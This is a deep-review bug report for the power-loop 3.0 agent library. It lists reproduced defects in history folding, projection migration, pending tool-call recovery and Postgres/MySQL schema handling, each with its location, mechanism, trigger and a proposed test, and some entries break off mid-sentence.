# power-loop 3.0 Deep Review — confirmed findings (2026-06-22)

Method: 6 per-subsystem finders → refute-by-default verify (reproduced against .venv) → test-quality audit. 16 confirmed ({'critical': 0, 'high': 4, 'medium': 5}), 2 false/known, 23 weak tests.

## Confirmed bugs

### [MEDIUM] identity-projector-compact-dataloss (reproduced)
**Legacy IdentityProjector is routed to the projection-fold path and silently drops all folded history**

- Where: power_loop/agent/types.py:223 (projection_representation) + :32-40 (_fold_from_legacy_projector) + power_loop/runtime/history_projector.py:171-204 (IdentityProjector, no `kind`, render() ignores compact)
- Mechanism: IdentityProjector is a shipped/public/documented legacy projector that promises 'byte-identical history to the no-projector default' and never folds (keep_last_sends=0). When passed as the deprecated `history_projector=`, _map_legacy_axes sets it as `representation` (types.py:158). `projection_representation` decides verbatim-vs-projection by `getattr(rep,'kind','projection') != 'verbatim'`. IdentityProjector has NO `kind` attribute, so the default 'projection' is used -> it is treated as a projection-style representation and resolve_compactor() returns None, putting the session on the derived-layer end-of-send fold path. Separately, `_fold_from_legacy_projector` seeds the fold with `keep = max(1, int(getattr(proj,'keep_last_sends',4) or 4))`; IdentityProjector's `keep_last_sends=0` is falsy so `0 or 4` -> keep=4, overriding the 'never fold' intent. Folding therefore fires once history exceeds the threshold. The fold writes a `compact` row, and the next send renders prefix via `projector.render([compact])` (stateful_loop.py:1290) — but IdentityProjector.render does `(r.content or {}).get('messages')`, and a compact row's content is `{'summary': ...}` with no 'messages' key, so it renders to `[]`. Every folded send is permanently and silently dropped from the LLM context (verified: IdentityProjector().render([compact]) == []). DefaultDeterministicProjector does NOT have this bug because its render handles kind=='compact'.
- Trigger: AgentLoopConfig(history_projector=IdentityProjector(), max_tokens=<small>) on a session that accumulates >4 sends past the token threshold. After the first fold, all sends older than the last 4 vanish from context (the compact renders empty). Reproduced: hasattr(IdentityProjector(),'kind')==False; AgentLoopConfig(history_projector=IdentityProjector()).projection_representation is not None; .fold_strategy.keep_last_sends==4; IdentityProjector().render([compact_row])==[].
- Test: Build a session with IdentityProjector via the legacy history_projector kwarg, drive >keep+1 sends past the fold threshold, then assert the rendered history still contains content from the folded sends (it does not today). Also assert AgentLoopConfig(history_projector=IdentityProjector()).projection_representation is None (a verbatim-intent projector must take the verbatim path) OR that IdentityProjector.render([compact]) is non-empty.
- Verify: REPRODUCED end-to-end via static analysis + runtime checks in power-loop/.venv. The bug is real and not in the known-fixed lists (BUG_REVIEW_2.0 / HARDENING_PLAN).

Confirmed each link in the chain:
1. IdentityProjector has NO `kind` attr → `hasattr(IdentityProjector(),'kind')==False`. So AgentLoopConfig.projection_representation (types.py:223, `getattr(rep,'kind','projection') != 'verbatim'`) returns the IdentityProjector instance, NOT None. Verified: `AgentLoopConfig(history_projector=IdentityProjector()).projection_representation is None` → False. resolve_compactor() → None. So the session 

### [HIGH] migration-fold-softfail-dataloss (reproduced)
**Projection migration with a pre-existing compact_note loses the foldable sends when the fold soft-fails**

- Where: power_loop/agent/stateful_loop.py:1514-1522 (_migrate_prior_history_to_projection fallback branch) + reader cutoff at :1271-1297
- Mechanism: During the one-time switch-to-projection migration, when the session already has an in-place `compact_note` AND there are foldable sends beyond the keep-recent floor, `to_compact` = [note-as-compact] + projected fold sends, and the configured fold_strategy is run to merge them into ONE compact. If the fold soft-fails (LLM error / timeout / empty summary -> _run_fold_with_timeout returns None), control falls to the `elif note is not None` branch (line 1518). That branch writes a compact whose CONTENT is ONLY the note's summary ({'summary': note.content}) but whose range is `from_send=0, to_send=min(recent)-1`. That to_send range index-COVERS the unfolded fold sends (e.g. fold=[1,2,3], recent=[4,5,6,7] -> to_send=3) even though their content was never merged in. The reader uses `cutoff = compact.compact_to_send` and `load_project_messages(after=cutoff)` + iterates active_by_send with `lo < s` (lo=cutoff) (stateful_loop.py:1272,1296-1297), so sends 1..3 are excluded from context forever. The migration marker (projection_migrated) is set in the same tx, so it is never retried. Net: a transient fold failure during migration permanently drops real history from rendered context (it remains only in the immutable pl_messages audit, never surfaced).
- Trigger: A session previously compacted by the in-place compactor (has a compact_note) and holding more than keep_last_sends additional sends, opened in projection mode for the first time (migrate_history_on_switch=True), while the fold LLM call errors or times out (or returns an empty/unwrapped summary so _strip_summary -> None). Math verified: keep=4, prior=[1..7] -> fold=[1,2,3], recent=[4,5,6,7]; fallback writes compact from_send=0 to_send=3 with content = note only; sends 1-3 lost.
- Test: Migrate a session that has a compact_note plus >keep foldable sends using a fold_strategy whose fold() returns None (soft-fail). Assert the migrated projection still represents the folded sends' content (either the fold-soft-fail aborts the whole migration so it retries, or the standalone-note fallback uses to_send=0 / does not claim a range it cannot cover). Today the test fails: rendered context omits the fold sends while the compact's to_send claims to cover them.
- Verify: REPRODUCED with a focused unit test on the real code (power_loop/agent/stateful_loop.py:1445-1542, reader 1271-1299, store write_projection_migration store.py:686-727). The cited path is power_loop/agent/stateful_loop.py (finding said power_loop/agent/...; correct module, line numbers ~exact: fallback branch at 1518-1522, reader cutoff at 1272/1296-1297).

Mechanism confirmed exactly as described:
- _run_fold_with_timeout (1648) returns None on timeout/error/empty-summary soft-fail.
- In _migrate_prior_history_to_projection, when note is not None AND there are foldable sends beyond keep, to_co

### [LOW] legacy-keep-zero-coerced-to-four (reproduced)
**Legacy projector keep_last_sends=0 is silently coerced to 4 by the fold seeder**

- Where: power_loop/agent/types.py:38-40 (_fold_from_legacy_projector)
- Mechanism: `keep = max(1, int(getattr(proj, 'keep_last_sends', 4) or 4))`. The `or 4` makes a legitimate, explicitly-configured `keep_last_sends=0` fall through to 4 (0 is falsy), and likewise `trigger = float(getattr(...,'trigger_ratio',0.75) or 0.75)` turns an explicit 0.0 into 0.75. An operator (e.g. DeepTalk admin config or a legacy DefaultDeterministicProjector) who set keep_last_sends=0 to fold aggressively gets keep=4 instead, a real behavior change in how much recent history is kept individually vs folded. The intended migration is supposed to PRESERVE the operator's keep/trigger knobs (that is the documented purpose of this helper), but it instead overrides falsy-but-valid values. The new fold requires keep>=1 so 0 cannot map literally, but coercing to 4 (rather than 1) is arbitrary and unannounced. Verified: DefaultDeterministicProjector(keep_last_sends=0) -> seeded fold keep_last_sends==4.
- Trigger: AgentLoopConfig(history_projector=DefaultDeterministicProjector(keep_last_sends=0)) (or any legacy projector/admin config with keep_last_sends=0 or trigger_ratio=0.0). The resulting fold keeps 4 recent sends instead of the configured 0.
- Test: Assert AgentLoopConfig(history_projector=DefaultDeterministicProjector(keep_last_sends=0)).fold_strategy.keep_last_sends == 1 (clamp to the minimum legal value) rather than 4, and that trigger_ratio=0.0 maps to a documented value rather than being replaced by 0.75.
- Verify: REPRODUCED the core mechanism, but the finding is partly wrong and lands on a deprecated (non-production) path, so severity downgraded medium→low.

WHAT'S REAL: power_loop/agent/types.py:38 `keep = max(1, int(getattr(proj,'keep_last_sends',4) or 4))`. The `or 4` clobbers an explicit `keep_last_sends=0`. Reproduced live via .venv:
  DefaultDeterministicProjector(keep_last_sends=0) -> AgentLoopConfig(history_projector=...).fold_strategy.keep_last_sends == 4   (warnings: only the DeprecationWarning; no notice about the coercion)
  IdentityProjector() (default keep_last_sends=0) -> seeded fold kee

### [LOW] degrade-verbatim-renders-full-uncompacted-history (partial)
**Projection-to-verbatim degradation ignores existing projection compacts and renders the entire uncompacted message log**

- Where: power_loop/agent/stateful_loop.py:1177 and 1313
- Mechanism: When projection mode degrades to verbatim (current_send_index None on resume-before-send, or an un-migrated in-place compact_note present), projection_active becomes False and history is rendered from load_active_messages on the message log only. The message log is never compacted in projection mode, so a long session renders the entire uncompacted transcript verbatim and ignores the compact plus per-send projection rows already stored, potentially far over budget despite an existing summary. Documented best-effort with unusual triggers, but the degrade silently discards the summaries meant to bound the window.
- Trigger: A long projection session already folded into the projection table where resume or submit_input runs before any send in the current process, so send_index reads 0 and current_send_index is None, forcing the verbatim degrade.
- Test: Build a projection session with many sends and an existing compact, then call resume or submit_input with no prior send in that loop instance; assert the prompt token count is bounded near the compact plus tail rather than the full verbatim history. Fails today. Fix: the degrade path should still read the projection compact plus after-cursor rows when present.
- Verify: PARTIAL: mechanism is real and I reproduced over-budget rendering for one of the two stated triggers, but trigger #1 is a factual misread and the reproducible trigger needs non-default config.

CONFIRMED MECHANISM: The degrade-to-verbatim paths (stateful_loop.py:1183 and 1237) only flip the LOCAL `projection_active=False`; control falls to the else branch (line ~1313) which renders `history=[_row_to_loop_message(r) for r in active_rows]` = the full pl_messages audit log. In projection mode pl_messages is NEVER in-place compacted (types.py:232 resolve_compactor()→None whenever representation.ki

### [HIGH] abort-pending-missing-tool-calls (reproduced)
**abort_pending doesn't prime sink._tool_calls → inconsistent intermediate pending; crash mid-abort permanently strands the session**

- Where: power_loop/agent/stateful_loop.py:774-793 (abort_pending) interacting with power_loop/agent/sink.py:170-180 (on_message_appended remaining_tool_calls rebuild) and power_loop/agent/stateful_loop.py:1059-1060 (_execute_pending early-return on empty tool_calls)
- Mechanism: abort_pending sets sink._unresolved (line 775) and sink._assistant_seq (line 776) but never sets sink._tool_calls, which stays [] (sink __init__ default, sink.py:97). For each pending tool_call it calls sink.on_message_appended with a <aborted> tool row. When 2+ tool_calls are pending, after the FIRST is appended _unresolved is still non-empty, so sink.py:170-180 rebuilds the persisted pending's 'tool_calls' by filtering self._tool_calls (== []) → the new pending row has tool_call_ids=['b'] but tool_calls=[]. The final iteration empties _unresolved and sets pending=None, so a crash-free abort ends consistent — but a process crash/kill between iterations persists {tool_call_ids:['b'], tool_calls:[]}. On recovery, resume()→_execute_pending reads `tool_calls = pending.get('tool_calls') or []` == [] and returns immediately (stateful_loop.py:1059-1060) WITHOUT executing or resolving 'b' and WITHOUT clearing pending; _run_loop then runs a fresh round and returns status='completed' while pending stays set forever and tool_call 'b' never gets a result row. Reproduced: after first abort the persisted pending is {"tool_call_ids":["b"],"tool_calls":[]}; a subsequent resume() returns status=completed yet get_pending() is still non-null and no tool result row for 'b' exists. Setting sink._tool_calls = list(tool_calls) in abort_pending makes the intermediate state retain {id:'b',...} (verified).
- Trigger: 1) An assistant round emits 2+ parallel tool_calls (ids a,b) so the session goes pending with both. 2) Call abort_pending(sid) (or send(sid, heal_pending=True), which calls _heal_pending→abort_pending). 3) Process is killed/crashes after the first <aborted> row is written but before the second (e.g. SIGKILL, OOM, container restart — exactly the orchestrator-killed-run scenario heal_pending is built for). 4) New process calls loop.resume(sid): returns status='completed' but get_pending(sid) is still non-null and tool_call 'b' has no tool result row — session is permanently stuck pending; only a second abort_pending could rescue it, and SessionPendingError raised by send() reports pending_tool_calls=[] (misleading).
- Test: Unit test: seed a session with pending={assistant_seq, round_index:0, tool_call_ids:['a','b'], tool_calls:[{id:'a'...},{id:'b'...}]}; construct SQLiteSink and replicate abort_pending's priming (without _tool_calls) OR call loop.abort_pending but intercept after the first append; assert the persisted pending after the first <aborted> append has tool_calls listing 'b' (i.e. consistent with tool_call_ids). Today it asserts tool_calls==[] (fails after fix). Stronger end-to-end test: persist the crashed intermediate pending {tool_call_ids:['b'], tool_calls:[]}, call loop.resume(sid), and assert get_pending(sid) is None (today it is still non-null) and a tool row for 'b' exists.
- Verify: REPRODUCED both halves of the finding with a unit test against power-loop/.venv; source is restored unchanged afterward.

Source confirmation:
- abort_pending (stateful_loop.py:774-776) sets sink._unresolved and sink._assistant_seq but NEVER sink._tool_calls, which stays [] (sink __init__ default, sink.py:97).
- sink.on_message_appended tool branch (sink.py:170-180) rebuilds the persisted pending's "tool_calls" by filtering self._tool_calls. With _tool_calls==[], remaining_tool_calls==[] while tool_call_ids is correctly populated.
- _execute_pending (stateful_loop.py:1059-1061): `tool_calls = 

### [MEDIUM] execute-pending-empty-toolcalls-no-clear (reproduced)
**_execute_pending early-returns on empty tool_calls without clearing a still-set pending, so resume() cannot self-heal a tool_call_ids-only pending**

- Where: power_loop/agent/stateful_loop.py:1059-1061 (_execute_pending)
- Mechanism: _execute_pending computes `tool_calls = pending.get('tool_calls') or []` and `if not tool_calls: return`. Unlike abort_pending (line 771-773) it has NO fallback to reconstruct from pending['tool_call_ids']. So any pending whose tool_calls list is empty/absent but whose tool_call_ids is non-empty (produced by finding #1's crashed abort, or by any external writer that set only tool_call_ids) is treated as 'nothing to do': resume() skips execution AND never clears pending, then _run_loop runs a normal round and returns status='completed' on top of an assistant message with an unresolved tool_call — leaving the protocol-invalid pairing latent and pending permanently set. This is the recovery half of finding #1 and is independently wrong: resume should either reconstruct from tool_call_ids (like abort_pending) or refuse, not silently complete.
- Trigger: Session has pending={tool_call_ids:['b'], tool_calls:[]} (e.g. from a crash mid-abort, or a hand-written/legacy pending). Call loop.resume(sid). It returns status='completed', get_pending(sid) is still non-null, and tool_call 'b' has no result row.
- Test: Persist pending={assistant_seq:s, round_index:0, tool_call_ids:['b'], tool_calls:[]} on a session whose assistant row carries tool_call id 'b'; call loop.resume(sid); assert get_pending(sid) is None after resume (fails today).
- Verify: Confirmed by reading code and reproducing with the real StatefulAgentLoop. stateful_loop.py:1059-1061 (_execute_pending) does `tool_calls = pending.get("tool_calls") or []; if not tool_calls: return` with NO tool_call_ids fallback, unlike abort_pending (771-773) which has `... or [{"id": cid} for cid in pending.get("tool_call_ids", [])]`. REPRO: with pending={assistant_seq:1, round_index:0, tool_call_ids:['b'], tool_calls:[]} on a session whose assistant row carries tool_call 'b', loop.resume(sid) returned STATUS=completed, get_pending(sid) was STILL {'assistant_seq':1,...,'tool_call_ids':['b'

### [LOW] resume-before-send-orphan-assistant-row (reproduced)
**resume()/follow-up-as-send before any send() persists assistant/tool rows with send_index=NULL, polluting later projection partitioning as permanent legacy-prefix rows**

- Where: power_loop/agent/stateful_loop.py:675-700 (resume) + 1013-1047 (_persist_user_input is the ONLY send_index allocator) + 1122-1133/1250-1256 (projection legacy_rows = send_index is None)
- Mechanism: send_index is allocated exclusively in _persist_user_input (line 1029-1031). resume() (and any path that runs the pipeline without a user input) never allocates it, so when resume() is the FIRST operation on a fresh session, current_send_index stays None and the pipeline appends assistant rows with send_index=None (verified: a resume-before-send produced an assistant row with send_index=None while runtime send_index stayed 0). If the session is later opened in projection mode, those NULL rows are classified as legacy_rows (stateful_loop.py:1250-1256) and rendered verbatim as a permanent temporally-first prefix forever — they are real conversation content, not pre-projection import artifacts, so they bypass folding/compaction and can never be projected. Minor today (resume-before-send is an unusual call), but it silently creates content that the projection/fold machinery can never compact.
- Trigger: loop.new_session(); loop.resume(sid) (no prior send) while an LLM returns a normal assistant reply → an assistant row with send_index=NULL is persisted. Later run the same session with config.projection_representation set: that row renders verbatim as an uncompactable legacy prefix.
- Test: new_session; resume(sid) with a scripted plain assistant reply; assert the persisted assistant row's send_index is not None (or assert resume-before-send is rejected). Today the row has send_index=None.
- Verify: REPRODUCED with power-loop/.venv + scripted LLM. Finding is real (line numbers shifted post-3.0 commit c2759a4; file is power_loop/agent/stateful_loop.py). send_index is allocated ONLY in _persist_user_input (line 1029-1031); resume()/submit_input() (line 675-700) skip it, so on a fresh session runtime send_index stays 0 → current_send_index=None (line 1133) → pipeline.send_index=None (line 1390) → pipeline.py:342 omits the key → sink persists assistant row with send_index=None. Repro: new_session(); resume(sid) with a plain assistant reply produced `row seq=1 role=assistant send_index=None co

### [MEDIUM] recall-send-no-N-labels (reproduced)
**recall_send is unusable under the default 3.0 ProjectedRepresentation — its rendered context has no `#N` send-index labels**

- Where: power_loop/runtime/representation.py:262-291 (ProjectedRepresentation.render / _render_project / _render_compact); contract referenced in power_loop/tools/default_tools.py:1544-1552 (run_recall_send docstring) + 1296 wording 'by the send_index (the #N the summary shows)'
- Mechanism: The `recall_send` tool tells the model to call it with 'the #N the summary shows'. The LEGACY projector (history_projector.py DefaultDeterministicProjector.compact, lines 363-369) rendered every folded/live send with explicit `#{r.send_index} user:` / `#{r.send_index} agent:` markers, so the model could read an N and recall it. The 3.0 replacement ProjectedRepresentation.render emits user rows as bare joined text ({'role':'user','content':'\n'.join(humans)}), project rows as '[tools] ...\nfinal_text', and compact rows as just the raw summary string (_render_compact_row) — NONE of these include the send_index. So the assembled prompt contains zero `#N` markers; the model has no way to know which send_index to pass. recall_send still works data-wise (load_all_messages by send_index), but is undiscoverable/unusable as the default projection path's recall mechanism — the whole point of keeping pl_messages for recall_send is defeated.
- Trigger: Configure AgentLoopConfig(representation=ProjectedRepresentation(version=1), fold_strategy=LLMSummaryFold(keep_last_sends=2, trigger_ratio low), small max_tokens). Run ~6 sends so a fold occurs, then inspect the prompt for send 7: it contains 'folded', 'message number 5/6', etc. but no substring matching /#\d+/. Reproduced: /tmp/repro_recall_labels.py prints "Contains any '#<digit>' send-index label: False".
- Test: Build a session with ProjectedRepresentation + a fold, capture the assembled prompt (via a scripted LLM's recorded request.messages), and assert that at least one rendered message contains a '#<send_index>' marker for each folded/live past send (so the model can target recall_send). This FAILS today (no markers) and passes once render() (and the compact summary) re-emit per-send `#N` labels.
- Verify: REPRODUCED at the production render path, with a correction to the finding's framing. Built ProjectMessageRows for a folded compact (LLMSummaryFold summary) + live sends and ran the real ProjectedRepresentation.render (power_loop/runtime/representation.py:262-272) — the assembled prompt has zero #N markers:

  [user] 'User asked about pricing; agent computed totals; resolved a divide-by-zero error.'
  [user] 'what was the total again?'
  [assistant] '[tools] calc(result=42)\nThe total is 42.'
  ...
  send-index #N labels found: []
  Contains any '#<digit>' send-index label: False

The contract

### [LOW] migration-fold-softfail-drops-compression (reproduced)
**Projection migration silently fails to compress folded sends (and poisons its done-marker, never retrying) when the LLM fold soft-fails**

- Where: power_loop/agent/stateful_loop.py:1500-1534 (_migrate_prior_history_to_projection) — specifically the missing else when `folded is None and note is None`; marker gate at lines 1175 & 1184-1206
- Mechanism: _migrate_prior_history_to_projection splits prior sends into `fold` (older) and `recent` (last keep). It runs the configured fold over `fold` via _run_fold_with_timeout, which returns None on ANY soft-fail (LLM error, timeout, or summary that doesn't parse — all documented soft-fail paths in fold.py _summarize/_strip_summary). The result handling has only two branches: `if folded is not None` (write compact) and `elif note is not None` (preserve the in-place note as a standalone compact). When the session was never in-place-compacted (note is None) AND the fold returns None, BOTH branches are skipped, compact_tuple stays None, and write_projection_migration is called with ONLY the `recent` project_rows and no compact. The `fold` sends get NO projection rows and NO covering compact. write_projection_migration atomically sets metadata projection_migrated=current_send_index, and the gate (line 1175 `metadata.get('projection_migrated') is not None`) treats the session as fully migrated forever — the retry path (line 1219) only fires on an EXCEPTION, not on a None fold. Net: the folded sends are never compressed (they survive only via the read-path verbatim fallback from pl_messages — confirmed, so NOT data loss while pl_messages is intact, but if retention ever trims those rows they vanish with no summary), and the migration claims success while accomplishing nothing for them. The whole purpose of migration (compress old history) is defeated with no recovery.
- Trigger: Run ~5 sends under VerbatimRepresentation (no projection rows, no compact_note), then switch config.representation=ProjectedRepresentation with migrate_history_on_switch=True and a low max_tokens so the migration fold triggers, with an LLM whose summary call returns text without <summary>...</summary> (→ _strip_summary None → fold None). Reproduced: /tmp/repro_migfail.py shows project rows only for sends 4,5,6; sends 1,2,3 (the fold set) have NO project rows and NO compact; metadata projection_migrated=6.
- Test: Migrate a 5-send verbatim session into projection mode with a fold strategy stubbed to return None and note=None. Assert that after migration either (a) a compact row exists covering the folded sends, or (b) the projection_migrated marker is NOT set (so it retries). Today neither holds (marker set, no compact, folded sends absent) → test fails; passes once the missing else-branch writes a fallback compact (or leaves the marker unset on fold soft-fail).
- Verify: REPRODUCED. Code at power_loop/agent/stateful_loop.py:1514-1522 has only `if folded is not None:` / `elif note is not None:` with no else. fold soft-fail is real (runtime/fold.py: _summarize except→None L177-178, _strip_summary→None L145, _run_fold_with_timeout timeout→None L1661). When folded is None AND note is None, compact_tuple stays None and project_rows (L1524-1528) only includes `recent`, so the folded sends get neither a compact nor project rows; write_projection_migration (store.py:716-727) still sets projection_migrated unconditionally; gate at L1175 is `is not None` and retry only 

### [MEDIUM] verbatim-keep-unit-mismatch-splits-send (reproduced)
**Under verbatim, keep_last_sends is applied as keep_last_n (user-bounded exchanges), so follow-ups split a single send mid-way and fewer sends are kept than promised**

- Where: power_loop/agent/types.py:251-258 (resolve_compactor maps LLMSummaryFold.keep_last_sends → DefaultCompactor.keep_last_n) + power_loop/runtime/compact.py:253-271 (_tail_start counts a new exchange at every role=='user' message)
- Mechanism: A single power-loop send can contain MULTIPLE user rows (mid-run follow-ups via _drain_follow_up_messages / format_follow_up_user_message, and submit_input/resume appends) all sharing one send_index. The projection axis correctly counts in SENDS (keep_last_sends). But under verbatim representation, resolve_compactor maps keep_last_sends directly onto DefaultCompactor.keep_last_n, and DefaultCompactor._tail_start increments `kept` on EVERY role=='user' message — i.e. it counts user MESSAGES, not sends. So with keep_last_sends=2 and a current send that had 2 follow-ups, the kept tail boundary lands on a follow-up user row INSIDE the latest send: the send's original user turn gets folded into the summary while its own follow-ups (which reference it) stay verbatim — splitting one logical send across the fold boundary and keeping far fewer than 2 sends. Not protocol-invalid (atomic assistant↔tool pairs are still preserved), but it corrupts conversational coherence and silently under-keeps relative to the documented keep_last_sends semantics shared with the projection path.
- Trigger: Verbatim representation, LLMSummaryFold(keep_last_sends=2). A send with 2 follow-up user messages, preceded by 2 earlier sends. Reproduced: /tmp/repro_keepunit.py with keep_last_n=2 over [send1,a1,send2,a2,send3,follow3a,follow3b,a3] → fold span (0,4): the main user row 'send3' is folded out while kept tail = ['follow3a','follow3b','a3'].
- Test: Construct a verbatim history where the latest send has the main user row plus 2 follow-up user rows, with keep_last_sends=2, and assert the fold boundary never splits a send (the kept tail must include the latest send's ORIGINAL user row, not just its follow-ups). Fails today (main user row folded, follow-ups kept); passes once the verbatim keep unit is sends, not user-message exchanges.
- Verify: REPRODUCED on the real runtime path. Verified the chain: power_loop/agent/types.py resolve_compactor maps LLMSummaryFold.keep_last_sends -> DefaultCompactor.keep_last_n (verbatim branch only); pipeline.py:594/616 calls resolve_compactor().maybe_compact(self.history); DefaultCompactor._compactable_span -> _tail_start (compact.py:253-271) increments `kept` on EVERY role=='user' message. DefaultCompactor's own docstring says keep_last_n = "last N user-bounded EXCHANGES" (per user turn), confirming the unit mismatch vs the projection path which keeps WHOLE sends (stateful_loop.py:1604 "the most-re

### [LOW] verbatim-fallback-prefix-seq-none (reproduced)
**Projection read path maps verbatim-fallback prefix rows (which have real pl_messages seqs) to None in hist_seqs, so durable history-repair can't deactivate an orphan in that prefix**

- Where: power_loop/agent/stateful_loop.py:1294-1311 (verbatim fallback for missing/stale projection sends builds prefix_msgs via _verbatim() but sets hist_seqs to [None]*len(prefix_msgs)) + history_sanitize.py:88-90 (orphan tool only recorded in dropped_seqs when s is not None)
- Mechanism: When a past send has no current-version projection row, the reader falls back to rendering its raw pl_messages rows verbatim into prefix_msgs (line 1299 _verbatim → _row_to_loop_message, which carries real tool_calls/tool rows). Those rows have real seqs in pl_messages, but the parallel hist_seqs is hard-coded to None for the entire prefix block (line 1309 [None]*len(prefix_msgs)). If such a fallback prefix contains a corrupt orphan tool row, align_tool_calls correctly DROPS it from the prompt each load, but because its mapped seq is None it is never added to dropped_seqs, so the repair_corrupt_history=True durable repair (deactivate_messages) can never fix it. The orphan is silently re-dropped on every send forever instead of being healed once. This is the safe direction (no wrong deactivation), but it permanently defeats durable repair for the verbatim-fallback region. Note compaction is off in projection mode so there is no mis-fold risk; the impact is solely lost durability of the repair.
- Trigger: Projection mode session where one past send's projection row was never written (best-effort projection failed) AND that send's pl_messages contains an orphan tool row (e.g. crash between assistant tool_calls and tool result, or a bad import). With repair_corrupt_history=True, observe that store.deactivate_messages is never called for that orphan (dropped_seqs empty because the prefix seq is None), so the warning + re-sanitize recurs on every subsequent send.
- Test: Set up a projection session with a past send lacking a projection row and an orphan tool row in its pl_messages, repair_corrupt_history=True. Assert the orphan row's state becomes DROPPED after one send. Fails today (seq mapped to None → not in dropped_seqs → never deactivated); passes once the verbatim-fallback prefix carries the real per-row seqs (e.g. emit [r.seq for r in _verbatim_rows(si)] instead of None) so align_tool_calls can report and the loop can deactivate it.
- Verify: REPRODUCED with a runtime test against power_loop/.venv (SQLite in-memory store). Code paths confirmed: stateful_loop.py line 1307-1311 maps the ENTIRE prefix_msgs block (projector-rendered AND verbatim-fallback rows) to hist_seqs=[None]*len(prefix_msgs), discarding the real pl_messages seqs that _verbatim()/_row_to_loop_message carry for the fallback rows. history_sanitize.py:89 only appends an orphan tool row to dropped_seqs when `s is not None`. So a verbatim-fallback orphan -> seq None -> never in dropped_seqs -> store.deactivate_messages never called even with repair_corrupt_history=True.

### [HIGH] pg-column-exists-no-schema-scope (reproduced)
**Postgres v1→v2 send_index ALTER skipped (then v2 stamped) when same-named pl_messages exists in another schema — every append crashes**

- Where: power_loop/runtime/store/schema.py:236-253 (_column_exists, postgres branch lines 245-252); triggered from _migration_steps line 92; contrast _table_exists PG branch line 223-225 which IS search_path-aware via to_regclass
- Mechanism: _column_exists for Postgres runs `SELECT 1 FROM information_schema.columns WHERE table_name=? AND column_name=?` with NO `table_schema` scope (only MySQL adds `AND table_schema=DATABASE()`; the PG branch sets scope=''). information_schema.columns spans ALL schemas the role can see. During a v1→v2 AUTO_CREATE migration of schema S whose pl_messages lacks send_index, if ANY other visible schema (e.g. another tenant via table_prefix/search_path isolation) already has a pl_messages.send_index, the probe returns True and the `ALTER TABLE pl_messages ADD COLUMN send_index` (schema.py:93-96) is SKIPPED. ensure_schema then stamps version=2 (schema.py:415). The migration's catalog probe is thus inconsistent with _table_exists, which uses to_regclass (search_path-aware) and so resolves to the CORRECT schema. Net: S.pl_messages is permanently missing send_index but marked v2. Every append_message (store.py:333-343, which always INSERTs the send_index column) then fails with 'no column send_index' / column-count mismatch. I reproduced the resulting crash directly on SQLite by stamping a send_index-less pl_messages and calling append_message: OperationalError 'table pl_messages has no column named send_index'.
- Trigger: Postgres DSN; two schemas in one database both using the default pl_ prefix (multi-tenant via search_path), one already on v2 (has send_index), the other on v1. Open the v1 schema with AUTO_CREATE (set search_path to the v1 schema). The ALTER is skipped, v2 is stamped; the first append_message on that schema raises.
- Test: On a real PG: CREATE SCHEMA a; CREATE SCHEMA b; provision a fresh v2 store in schema a (gets pl_messages.send_index). In schema b build a v1 store by hand (pl_messages WITHOUT send_index + v1 stamp). Open schema b with AUTO_CREATE (search_path=b). Assert that b.pl_messages now HAS send_index (fails today — the cross-schema probe saw a.pl_messages and skipped the ALTER) and that append_message succeeds.
- Verify: REPRODUCED end-to-end on the live Postgres 16 (localhost:5433, deeptalk/power_loop_test) using power-loop/.venv. The finding is technically exact.

Source confirmation (power_loop/runtime/store/schema.py):
- _column_exists PG branch (line 245-246) sets scope="" and queries information_schema.columns with NO table_schema filter (only the MySQL branch adds `AND table_schema=DATABASE()`). information_schema.columns spans every schema the role can see, so the probe is cross-schema.
- By contrast _table_exists PG branch (line 224) uses to_regclass(?) which IS search_path-aware. The two catalog prob

### [LOW] stale-kind-projection-row-on-refinalize (partial)
**write_send_projection_rows leaks a stale-kind projection row on re-finalize under a different representation (no other-kind cleanup at send_index)**

- Where: power_loop/runtime/store/store.py:609-642 (write_send_projection_rows) / 501-537 (_upsert_project_message_tx)
- Mechanism: write_send_projection_rows UPSERTs only the kinds present in the supplied `rows` (PK = session_id,send_index,kind) and never deletes other-kind rows already at that send_index. The representations emit DIFFERENT kind sets for the same send: ProjectedRepresentation.project_send emits a `user` row + a `project` row (representation.py:194+), while VerbatimRepresentation.project_send emits ONLY a `project` row (representation.py:155-163). A resume re-finalizes the SAME send_index (stateful_loop.py:1564-1565 docstring: 'the resume re-finalizes under the SAME send_index; the idempotent UPSERT then overwrites'). If the representation differs between the first finalize and the resume, the new write overwrites the `project` row but the stale `user` row survives. On read, VerbatimRepresentation.render (representation.py:165-172) treats the leaked `user` row as `(content or {}).get('messages')` → renders empty (benign drop); the reverse direction (a leaked verbatim `project` row carrying {'messages':[...]} read by ProjectedRepresentation.render) renders against the wrong content shape → garbled/duplicated context. I reproduced the leak: after writing [user,project] then re-writing [project] at send_index=0, load_project_messages returns BOTH the stale ('user',{'human':['hi']}) and the new project row.
- Trigger: Send 0 first finalized under ProjectedRepresentation (writes user+project), then the run is resumed/re-finalized under VerbatimRepresentation (writes only project) at the same send_index, OR vice-versa, without going through write_projection_migration.
- Test: Call store.write_send_projection_rows(sid, send_index=0, rows=[('user',...),('project',...)]) then store.write_send_projection_rows(sid, send_index=0, rows=[('project',...)]). Assert load_project_messages(sid) has NO 'user' row at send 0 (fails today — the stale user row persists).
- Verify: The STORE-LEVEL leak is real and I reproduced it exactly: store.write_send_projection_rows (power_loop/runtime/store/store.py:609-642) UPSERTs only the supplied kinds (PK session_id,send_index,kind) and does NO other-kind cleanup at that send_index — unlike commit_projection_fold (line 673 DELETE) and write_projection_migration (line 794 DELETE). Repro (sqlite://:memory:): write rows=[('user',{'human':['hi']}),('project',...)] then re-write rows=[('project',{'messages':[...]})] at send_index=0 → load_project_messages returns BOTH the stale ('user',{'human':['hi']}) and the new project row. Con

### [LOW] mysql-index-name-divergence (reproduced)
**background_tasks index name differs on MySQL (idx_bgtasks_session_status) vs SQLite/PG (idx_background_tasks_session_status)**

- Where: power_loop/runtime/store/dialect.py:359 (MySQL) vs 114/243 (SQLite/PG)
- Mechanism: The MySQL DDL names the background_tasks index `{p}idx_bgtasks_session_status` while SQLite and Postgres name it `{p}idx_background_tasks_session_status`. ensure_schema VERIFY only probes TABLES (schema.py:_STORE_TABLES / _table_exists), not index names, so this does not break VERIFY today — but it is a silent cross-dialect divergence: any out-of-band tooling/migration that references the index by name, or a future VERIFY that checks indexes, will diverge per backend, and a provisioning_ddl script generated on one engine and (mis)applied conceptually to another will name the index differently.
- Trigger: Provision the same logical schema on MySQL vs SQLite/PG and compare index names, or write any operational script that DROP/ALTERs the background_tasks index by name expecting a single canonical name.
